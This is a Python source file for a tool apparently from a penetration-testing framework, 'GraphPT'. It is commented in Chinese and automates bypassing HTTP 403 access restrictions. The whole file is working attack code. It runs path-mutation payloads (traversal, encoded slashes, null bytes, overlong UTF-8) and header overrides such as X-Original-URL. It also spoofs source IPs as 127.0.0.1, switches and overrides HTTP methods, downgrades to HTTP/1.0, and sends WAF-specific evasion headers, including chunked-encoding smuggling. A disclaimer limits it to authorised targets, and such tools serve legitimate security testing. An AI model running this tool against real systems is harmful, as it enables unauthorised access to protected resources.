#!/usr/bin/env python
"""403bypass — 403 访问限制绕过工具（GraphPT 自研脚本工具）。

对爆破/扫描发现的 403 目录、文件、端点尝试全量绕过技术，成功者输出供入图留痕。

绕过技术分类：
  路径变异   /p/  /p//  /p/.  /p%2f  /p..;/  前导多斜杠  点号前缀 ...
  header覆盖 X-Original-URL / X-Rewrite-URL（用根路径 + header 指定真实路径）
  IP伪造     X-Forwarded-For / X-Real-IP / CF-Connecting-IP ... = 127.0.0.1
  Referer    Referer 指向目标本身
  方法切换   POST / HEAD / OPTIONS / PUT / TRACE
  方法覆盖   X-HTTP-Method-Override / X-Method-Override
  协议降级   HTTP/1.0
  编码变异   双重URL编码 / UTF-8超长 / 反斜杠
  大小写     /ADMIN /Admin

成功判定：状态码非 403（200/2xx/3xx/401）且响应体长度与基线 403 页明显不同。

底层用 http.client（保留畸形路径不规范化），前导斜杠变异用原始 socket 手写请求行。

用法：
  python 403bypass.py --url http://host/admin --target-id dir:xxx
  结果以 JSONL 输出到 stdout，每行一个成功的绕过尝试。

注意：本工具会主动请求目标，属攻击性测试，仅用于已授权的目标。
"""

from __future__ import annotations

import argparse
import http.client
import json
import socket
import ssl
import sys
import urllib.parse

_UA = "Mozilla/5.0 (GraphPT 403bypass)"
_DEFAULT_TIMEOUT = 10.0
_FAKE_IP = "127.0.0.1"
# 绕过成功认可的状态码（非 403/404 即视为可能突破）
_SUCCESS_CODES = {200, 201, 202, 203, 204, 206, 301, 302, 307, 308, 401}
# 响应体长度与基线 403 页差异阈值（字节）；小于此值视为同一页（假绕过）
_LEN_DELTA = 16
# 响应体留存上限（字节），避免大页面塞爆数据包文件
_BODY_CAP = 4096


def _split_url(url: str) -> tuple[str, str, int, str]:
    """拆 URL → (scheme, host, port, path)。path 保留原样不规范化。"""
    parsed = urllib.parse.urlsplit(url if "://" in url else f"http://{url}")
    scheme = (parsed.scheme or "http").lower()
    host = parsed.hostname or ""
    port = parsed.port or (443 if scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path = f"{path}?{parsed.query}"
    return scheme, host, port, path


def _fmt_request(method: str, path: str, host: str, headers: dict, version: str) -> str:
    """构造请求数据包文本（用于留痕）。"""
    lines = [f"{method} {path} {version}", f"Host: {host}"]
    for k, v in headers.items():
        lines.append(f"{k}: {v}")
    return "\r\n".join(lines) + "\r\n\r\n"


def _fmt_response(status: int, reason: str, headers: list, body: bytes) -> str:
    """构造响应数据包文本（状态行 + 头 + 截断的体）。"""
    lines = [f"HTTP/1.1 {status} {reason}"]
    for k, v in headers:
        lines.append(f"{k}: {v}")
    text = "\r\n".join(lines) + "\r\n\r\n"
    snippet = body[:_BODY_CAP].decode("utf-8", errors="replace")
    if len(body) > _BODY_CAP:
        snippet += f"\n...[truncated, total {len(body)} bytes]"
    return text + snippet


def _request(
    method: str,
    url_scheme: str,
    host: str,
    port: int,
    path: str,
    *,
    headers: dict | None = None,
    http_version: str = "HTTP/1.1",
    timeout: float = _DEFAULT_TIMEOUT,
) -> dict | None:
    """用 http.client 发请求，保留畸形路径不规范化。

    返回 {status, body_len, raw_request, raw_response} 或 None（连接失败）。
    """
    headers = dict(headers or {})
    headers.setdefault("User-Agent", _UA)
    try:
        if url_scheme == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
        # http.client 默认 HTTP/1.1；降级请求用 _raw_request 走 socket
        conn.request(method, path, headers=headers)
        resp = conn.getresponse()
        body = resp.read()
        result = {
            "status": resp.status,
            "body_len": len(body),
            "raw_request": _fmt_request(method, path, f"{host}:{port}", headers, http_version),
            "raw_response": _fmt_response(resp.status, resp.reason, resp.getheaders(), body),
        }
        conn.close()
        return result
    except (OSError, http.client.HTTPException, ssl.SSLError, socket.timeout):
        return None


def _raw_request(
    method: str,
    url_scheme: str,
    host: str,
    port: int,
    path: str,
    *,
    headers: dict | None = None,
    http_version: str = "HTTP/1.1",
    timeout: float = _DEFAULT_TIMEOUT,
) -> dict | None:
    """原始 socket 手写请求行，发送 http.client 会折叠的路径（如前导 //）。

    返回结构同 _request；解析响应仅取状态行 + 体长度（够判定）。
    """
    headers = dict(headers or {})
    headers.setdefault("User-Agent", _UA)
    req_text = _fmt_request(method, path, host, headers, http_version)
    try:
        raw = socket.create_connection((host, port), timeout=timeout)
        if url_scheme == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            raw = ctx.wrap_socket(raw, server_hostname=host)
        raw.sendall(req_text.encode("latin-1", errors="replace"))
        chunks = []
        raw.settimeout(timeout)
        while True:
            try:
                buf = raw.recv(8192)
            except socket.timeout:
                break
            if not buf:
                break
            chunks.append(buf)
            if sum(len(c) for c in chunks) > _BODY_CAP * 4:
                break
        raw.close()
    except (OSError, ssl.SSLError, socket.timeout):
        return None

    data = b"".join(chunks)
    # 解析状态行 + 分离头/体
    head, _, body = data.partition(b"\r\n\r\n")
    first_line = head.split(b"\r\n", 1)[0].decode("latin-1", errors="replace")
    status = 0
    parts = first_line.split(" ", 2)
    if len(parts) >= 2 and parts[1].isdigit():
        status = int(parts[1])
    raw_response = head.decode("latin-1", errors="replace") + "\r\n\r\n" + \
        body[:_BODY_CAP].decode("utf-8", errors="replace")
    return {
        "status": status,
        "body_len": len(body),
        "raw_request": req_text,
        "raw_response": raw_response,
    }


# ---- 绕过技术库 ----
#
# 每个技术产出一个 spec dict：
#   {method, path, headers, version, raw}
#   raw=True 表示走原始 socket（前导斜杠等 http.client 会折叠的路径）
# {p} = 原始路径（如 /admin），{full} = 完整 URL，{base} = 路径去掉前导/


def _path_mutations(path: str) -> list[tuple[str, str]]:
    """路径变异：返回 [(technique, 变异后path), ...]。"""
    p = path.split("?", 1)[0].rstrip("/") or "/"
    base = p.lstrip("/")
    muts = [
        ("path-suffix-slash", f"{p}/"),
        ("path-suffix-double-slash", f"{p}//"),
        ("path-suffix-dot", f"{p}/."),
        ("path-suffix-dot-slash", f"{p}/./"),
        ("path-wrap-dot-slash", f"/./{base}/./"),
        ("path-encoded-slash-suffix", f"{p}%2f"),
        ("path-encoded-dot-prefix", f"/%2e/{base}"),
        ("path-semicolon-traversal", f"{p}..;/"),
        ("path-slash-semicolon-traversal", f"{p}/..;/"),
        ("path-space-suffix", f"{p}%20"),
        ("path-tab-suffix", f"{p}%09"),
        ("path-question-suffix", f"{p}?"),
        ("path-double-question", f"{p}??"),
        ("path-hash-suffix", f"{p}%23"),
        ("path-ext-json", f"{p}.json"),
        ("path-ext-html", f"{p}.html"),
        ("path-semicolon-css", f"{p};.css"),
        ("path-null-byte", f"{p}%00"),
        ("path-null-byte-ext", f"{p}%00.jpg"),
        ("path-uppercase", f"/{base.upper()}" if base else p),
        ("path-capitalize", f"/{base.capitalize()}" if base else p),
        ("path-double-encode-traversal", f"/%252e%252e{p}"),
        ("path-utf8-overlong", f"/%c0%ae{p}"),
        ("path-backslash-prefix", f"\\{base}"),
        ("path-encoded-backslash", f"/%5c{base}"),
        ("path-dot-slash-prefix", f".//{base}"),
        ("path-triple-dot", f"/.../{base}"),
    ]
    # 前导多斜杠（http.client 会折叠 → 需走 raw socket）
    raw_muts = [
        ("path-leading-double-slash", f"//{base}"),
        ("path-leading-triple-slash", f"///{base}"),
        ("path-leading-double-trailing", f"//{base}//"),
    ]
    return muts, raw_muts


# ── WAF 专用绕过 payload ──
_WAF_PAYLOADS: dict[str, list[tuple[str, str, dict]]] = {
    "cloudflare": [
        ("waf-cf-ipcountry", "GET", {"CF-IPCountry": "US"}),
        ("waf-cf-worker", "GET", {"CF-Worker": "graphpt.workers.dev"}),
        ("waf-cf-true-client-ip", "GET", {"True-Client-IP": _FAKE_IP}),
        ("waf-cf-cache-purge", "PURGE", {}),
    ],
    "aws-waf": [
        ("waf-aws-xff-chain", "GET", {"X-Forwarded-For": "127.0.0.1, 127.0.0.1, 127.0.0.1"}),
    ],
    "modsecurity": [
        ("waf-modsec-ct", "POST", {"Content-Type": "multipart/form-data; boundary=x"}),
        ("waf-modsec-chunked", "GET", {"Transfer-Encoding": "chunked"}),
    ],
    "f5-bigip": [
        ("waf-f5-xfh", "GET", {"X-Forwarded-Host": "127.0.0.1"}),
    ],
    "imperva": [
        ("waf-imperva-xff-chain", "GET", {"X-Forwarded-For": "127.0.0.1, 127.0.0.1"}),
        ("waf-imperva-via", "GET", {"Via": "1.1 example.com"}),
    ],
    "akamai": [
        ("waf-akamai-pragma", "GET", {"Pragma": "akamai-x-get-cache-key"}),
        ("waf-akamai-tcip", "GET", {"True-Client-IP": _FAKE_IP}),
    ],
    "generic": [
        ("waf-gen-smuggle", "GET", {"Transfer-Encoding": " chunked"}),
    ],
}


def _parse_waf(tech_str: str) -> str:
    """tech 字符串 → 已知 WAF 类型。"""
    if not tech_str:
        return ""
    t = tech_str.lower()
    if "cloudflare" in t: return "cloudflare"
    if "aws" in t or "awswaf" in t: return "aws-waf"
    if "modsecurity" in t or "modsec" in t: return "modsecurity"
    if "f5" in t or "bigip" in t or "big-ip" in t: return "f5-bigip"
    if "imperva" in t or "incapsula" in t: return "imperva"
    if "akamai" in t: return "akamai"
    if "waf" in t: return "generic"
    return ""


def _iter_techniques(scheme: str, host: str, port: int, path: str, full_url: str, waf: str = ""):
    """产出所有绕过 spec：(technique, method, path, headers, version, raw)。"""
    real_path = path.split("?", 1)[0] or "/"

    # A. 路径变异
    muts, raw_muts = _path_mutations(path)
    for tech, mp in muts:
        yield (tech, "GET", mp, {}, "HTTP/1.1", False)
    for tech, mp in raw_muts:
        yield (tech, "GET", mp, {}, "HTTP/1.1", True)

    # B. header URL 覆盖（请求根路径，用 header 指真实路径）
    for hdr in ("X-Original-URL", "X-Rewrite-URL", "X-Override-URL"):
        yield (f"header-{hdr.lower()}", "GET", "/", {hdr: real_path}, "HTTP/1.1", False)

    # C. IP 伪造 header（请求原路径 + 来源 IP 头）
    for hdr in ("X-Forwarded-For", "X-Originating-IP", "X-Remote-IP", "X-Client-IP",
                "X-Real-IP", "X-Host", "X-Custom-IP-Authorization", "CF-Connecting-IP",
                "X-Forwarded-Host", "True-Client-IP"):
        yield (f"ipspoof-{hdr.lower()}", "GET", real_path, {hdr: _FAKE_IP}, "HTTP/1.1", False)

    # D. Referer 绕过
    yield ("header-referer", "GET", real_path, {"Referer": full_url}, "HTTP/1.1", False)

    # E. 方法切换
    for m in ("POST", "HEAD", "OPTIONS", "PUT", "TRACE", "PATCH"):
        yield (f"method-{m.lower()}", m, real_path, {}, "HTTP/1.1", False)

    # F. 方法覆盖 header
    for hdr in ("X-HTTP-Method-Override", "X-Method-Override", "X-HTTP-Method"):
        yield (f"method-override-{hdr.lower()}", "POST", real_path, {hdr: "GET"}, "HTTP/1.1", False)

    # G. 协议降级（走 raw socket 才能真正发 HTTP/1.0）
    yield ("proto-http10", "GET", real_path, {}, "HTTP/1.0", True)

    # H. WAF 自适应 payload
    waf_type = _parse_waf(waf)
    if waf_type and waf_type in _WAF_PAYLOADS:
        for tech, method, headers in _WAF_PAYLOADS[waf_type]:
            yield (tech, method, real_path, headers, "HTTP/1.1", False)
    if waf_type and waf_type != "generic":
        for tech, method, headers in _WAF_PAYLOADS.get("generic", []):
            yield (tech, method, real_path, headers, "HTTP/1.1", False)


def _is_success(status: int, body_len: int, base_status: int, base_len: int) -> bool:
    """判定绕过成功：状态码非 403 且响应体与基线 403 页明显不同。"""
    if status not in _SUCCESS_CODES:
        return False
    # 体长度与基线 403 页几乎一致 → 很可能是同一个拒绝页（假绕过）
    if abs(body_len - base_len) <= _LEN_DELTA:
        return False
    return True


def run(url: str, target_id: str, timeout: float, waf: str = "") -> dict:
    """对一个 403 目标跑全量绕过，返回 {attempts, successes, results}。"""
    scheme, host, port, path = _split_url(url)
    if not host:
        print(f"[!] 无效 URL: {url}", file=sys.stderr)
        return {"attempts": 0, "successes": 0, "results": []}

    # 基线：原始路径请求，拿 403 页的体长度作基准
    base = _request("GET", scheme, host, port, path, timeout=timeout)
    if base is None:
        print(f"[!] 基线请求失败（目标不可达）: {url}", file=sys.stderr)
        return {"attempts": 0, "successes": 0, "results": []}
    base_status, base_len = base["status"], base["body_len"]
    print(f"[*] 基线 {url} → status={base_status} len={base_len}", file=sys.stderr)

    results = []
    attempts = 0
    for tech, method, mpath, headers, version, raw in _iter_techniques(scheme, host, port, path, url, waf):
        attempts += 1
        fn = _raw_request if raw else _request
        r = fn(method, scheme, host, port, mpath, headers=headers, http_version=version, timeout=timeout)
        if r is None:
            continue
        ok = _is_success(r["status"], r["body_len"], base_status, base_len)
        if ok:
            results.append({
                "target_id": target_id,
                "technique": tech,
                "raw_request": r["raw_request"],
                "raw_response": r["raw_response"],
                "final_status": r["status"],
                "success": True,
            })
            print(f"[+] 绕过成功 [{tech}] {method} {mpath} → {r['status']} (len={r['body_len']})",
                  file=sys.stderr)

    return {"attempts": attempts, "successes": len(results), "results": results}


def main() -> int:
    # Windows 默认 stdout 可能是 gbk，强制 UTF-8 避免畸形响应字节编码失败
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, ValueError):
        pass

    ap = argparse.ArgumentParser(description="403 访问限制绕过工具（GraphPT）")
    ap.add_argument("--url", required=True, help="要绕过的 403 资源完整 URL")
    ap.add_argument("--target-id", default="", help="DirEntry/HTTPEndpoint 节点 id（回写用）")
    ap.add_argument("--timeout", type=float, default=_DEFAULT_TIMEOUT, help="单请求超时秒数")
    ap.add_argument("--waf", default="", help="WAF/tech 类型 (逗号分隔)，用于选择专用绕过 payload")
    args = ap.parse_args()

    out = run(args.url, args.target_id, args.timeout, args.waf)
    # 成功结果以 JSONL 输出到 stdout，供 adapter 解析入图
    for item in out["results"]:
        print(json.dumps(item, ensure_ascii=False))
    print(f"[*] 完成：尝试 {out['attempts']} 种技术，成功 {out['successes']} 种",
          file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())



